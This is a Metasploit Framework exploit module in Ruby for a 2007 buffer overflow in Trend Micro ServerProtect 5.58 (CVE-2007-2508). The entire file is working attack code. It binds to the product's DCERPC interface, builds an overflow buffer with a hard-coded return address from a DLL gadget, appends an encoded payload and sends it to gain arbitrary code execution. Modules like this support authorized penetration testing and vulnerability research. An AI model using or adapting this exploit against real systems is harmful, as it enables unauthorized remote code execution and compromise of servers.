##
# $Id: trendmicro_serverprotect_createbinding.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::DCERPC

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Trend Micro ServerProtect 5.58 CreateBinding() Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Trend Micro ServerProtect 5.58 Build 1060.
				By sending a specially crafted RPC request, an attacker could overflow the
				buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					['CVE', '2007-2508'],
					['OSVDB', '35790'],
					['BID', '23868'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Trend Micro ServerProtect 5.58 Build 1060', { 'Ret' => 0x65675aa8 } ], # pop esi; pop ecx; ret - StRpcSrv.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 7 2007'))

		register_options( [ Opt::RPORT(5168) ], self.class )
	end

	def exploit
		connect
		handle = dcerpc_handle('25288888-bd5b-11d1-9d53-0080c83a5c2c', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		filler =  rand_text_alpha(360) + Rex::Arch::X86.jmp_short(6) + make_nops(2)
		filler << [target.ret].pack('V') + payload.encoded
		filler << rand_text_english(1400 - payload.encoded.length)

		len    = filler.length

		sploit = NDR.long(0x001f0002) + NDR.long(len) + filler + NDR.long(len)

		print_status("Trying target #{target.name}...")

		begin
			dcerpc_call(0, sploit)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
		end

		handler
		disconnect
	end

end
